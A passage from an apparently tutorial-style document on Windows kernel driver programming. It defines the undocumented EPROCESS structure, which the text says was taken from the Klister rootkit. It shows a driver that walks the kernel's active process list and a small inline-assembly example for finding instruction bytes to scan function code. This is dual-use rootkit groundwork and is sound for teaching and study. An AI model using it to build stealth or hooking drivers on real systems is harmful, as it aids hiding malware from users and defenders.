style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*18C*/
DWORD<span style="mso-spacerun: yes">                  </span>LastFaultCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*190*/
DWORD<span style="mso-spacerun: yes">                 
</span>ModifiedPageCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*194*/
PVOID<span style="mso-spacerun: yes">                  </span>VadRoot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*198*/
PVOID<span style="mso-spacerun: yes">                  </span>VadHint;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*19C*/
PVOID<span style="mso-spacerun: yes">                  </span>CloneRoot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1A0*/
DWORD<span style="mso-spacerun: yes">                  </span>NumberOfPrivatePages;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1A4*/
DWORD<span style="mso-spacerun: yes">                 
</span>NumberOfLockedPages;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1A8*/
WORD<span style="mso-spacerun: yes">                   </span>NextPageColor;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1AA*/
BOOLEAN<span style="mso-spacerun: yes">               
</span>ExitProcessCalled;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1AB*/
BOOLEAN<span style="mso-spacerun: yes">               
</span>CreateProcessReported;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1AC*/
HANDLE<span style="mso-spacerun: yes">                 </span>SectionHandle;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1B0*/
struct _PEB<span style="mso-spacerun: yes">           </span>*Peb;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1B4*/
PVOID<span style="mso-spacerun: yes">                 
</span>SectionBaseAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1B8*/
struct QUOTA_BLOCK<span style="mso-spacerun: yes">     </span>*QuotaBlock;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1BC*/
NTSTATUS<span style="mso-spacerun: yes">              
</span>LastThreadExitStatus;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1C0*/
DWORD<span style="mso-spacerun: yes">                  </span>WorkingSetWatch;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1C4*/
HANDLE<span style="mso-spacerun: yes">                
</span>Win32WindowStation;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1C8*/
DWORD<span style="mso-spacerun: yes">                 
</span>InheritedFromUniqueProcessId;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1CC*/
ACCESS_MASK<span style="mso-spacerun: yes">            </span>GrantedAccess;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1D0*/
DWORD<span style="mso-spacerun: yes">                 
</span>DefaultHardErrorProcessing; // HEM_*<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1D4*/
DWORD<span style="mso-spacerun: yes">                  </span>LdtInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1D8*/
PVOID<span style="mso-spacerun: yes">                  </span>VadFreeHint;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1DC*/
DWORD<span style="mso-spacerun: yes">                  </span>VdmObjects;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1E0*/
PVOID<span style="mso-spacerun: yes">                  </span>DeviceMap; //
0x24 bytes<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1E4*/
DWORD<span style="mso-spacerun: yes">                  </span>SessionId;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1E8*/
DWORD<span style="mso-spacerun: yes">                  </span>d1E8;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1EC*/
DWORD<span style="mso-spacerun: yes">            </span><span
style="mso-spacerun: yes">      </span>d1EC;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1F0*/
DWORD<span style="mso-spacerun: yes">                  </span>d1F0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1F4*/
DWORD<span style="mso-spacerun: yes">                  </span>d1F4;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1F8*/
DWORD<span style="mso-spacerun: yes">                  </span>d1F8;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1FC*/
BYTE<span style="mso-spacerun: yes">                   </span>ImageFileName
[16];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*20C*/
DWORD<span style="mso-spacerun: yes">                  </span>VmTrimFaultValue;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*210*/
BYTE<span style="mso-spacerun: yes">                   </span>SetTimerResolution;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*211*/
BYTE<span style="mso-spacerun: yes">                   </span>PriorityClass;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*212*/
union<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>struct<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">                </span>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*212*/<span
style="mso-spacerun: yes">         </span>BYTE<span style="mso-spacerun:
yes">               </span>SubSystemMinorVersion;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*213*/<span
style="mso-spacerun: yes">         </span>BYTE<span style="mso-spacerun:
yes">               </span>SubSystemMajorVersion;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">           </span><span style="mso-spacerun:
yes">     </span>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>struct<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">                </span>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*212*/<span
style="mso-spacerun: yes">         </span>WORD<span style="mso-spacerun:
yes">               </span>SubSystemVersion;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">                </span>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*214*/
struct _WIN32_PROCESS *Win32Process;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*218*/
DWORD<span style="mso-spacerun: yes">                  </span>d218;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*21C*/
DWORD<span style="mso-spacerun: yes">                  </span>d21C;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*220*/
DWORD<span style="mso-spacerun: yes">                  </span>d220;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*224*/
DWORD<span style="mso-spacerun: yes">                  </span>d224;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*228*/
DWORD<span style="mso-spacerun: yes">                  </span>d228;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*22C*/
DWORD<span style="mso-spacerun: yes">                  </span>d22C;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*230*/
PVOID<span style="mso-spacerun: yes">                  </span>Wow64;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*234*/
DWORD<span style="mso-spacerun: yes">                  </span>d234;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*238*/
IO_COUNTERS<span style="mso-spacerun: yes">            </span>IoCounters;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*268*/
DWORD<span style="mso-spacerun: yes">                  </span>d268;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*26C*/
DWORD<span style="mso-spacerun: yes">                  </span>d26C;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*270*/
DWORD<span style="mso-spacerun: yes">                  </span>d270;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*274*/
DWORD<span style="mso-spacerun: yes">                  </span>d274;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*278*/
DWORD<span style="mso-spacerun: yes">                  </span>d278;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*27C*/
DWORD<span style="mso-spacerun: yes">                  </span>d27C;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*280*/
DWORD<span style="mso-spacerun: yes">                </span><span
style="mso-spacerun: yes">  </span>d280;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*284*/
DWORD<span style="mso-spacerun: yes">                  </span>d284;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
EPROCESS1 *p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*entry, *start;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (struct EPROCESS1 *)PsGetCurrentProcess();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2 p=%x&quot;,p);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>entry
= start = (LIST_ENTRY *)p-&gt;ActiveProcessLinks.Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s
%d&quot;,p-&gt;ImageFileName,p-&gt;UniqueProcessId);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>entry
= entry-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (struct EPROCESS1 *)((char *)entry - 160);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(entry != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Vijay
2 p=8202fb60<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>System
8<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>csrss.exe
180<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>If
you look at the above program output you will wonder why are we displaying the same
output which is nothing but a list of processes running on the system. Also the
program is slightly too large for our liking. All that we have done is created
a structure tag EPROCESS1 tag represents the actual EPROCESS structure. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>As
mentioned before, this structure is not documented by Microsoft. It is one of
the largest structures we have seen and we found it in a header file in the
Klister rootkit. Wonder how people find out these undocumented<span
style="mso-spacerun: yes">  </span>structures. Going back to our code we use
the same LIST_ENTRY pointers but use members of the EPROCESS structure to print
out the pid and name of the process instead of using hard coded offsets. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
problem is that we yet have to subtract 160 from the LIST_ENTRY pointers as
they point to the LIST_ENTRY structures and we have no pointer to the start of
the EPROCESS structure. Some day we would like you to print out every member of
the structures shown above.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P53<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__asm
int 3<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__asm
mov ecx,3<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__asm
test al,al<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cl
p.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Lots
of times we would like to scan the code of functions looking for certain bytes.
Lets say we know that a certain function uses the mov instruction to move a
value in the ecx register and then uses the test instruction to test the value
of the al instruction. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
would like to know the actual bytes that this code snippet generates. In a C
program using the _asm keyword we are allowed to embed assembler instructions
anywhere we like. The int 3 calls the debugger. We click ob Cancel and when we
are in the debugger, we click on right mouse button and check code bytes. We
will see the following output. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>00401006
CC<span style="mso-spacerun: yes">                   </span>int<span
style="mso-spacerun: yes">         </span>3<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>00401007
B9 03 00 00 00<span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">         </span>ecx,3<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>0040100C
84 C0<span style="mso-spacerun: yes">                </span>test<span
style="mso-spacerun: yes">        </span>al,al<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

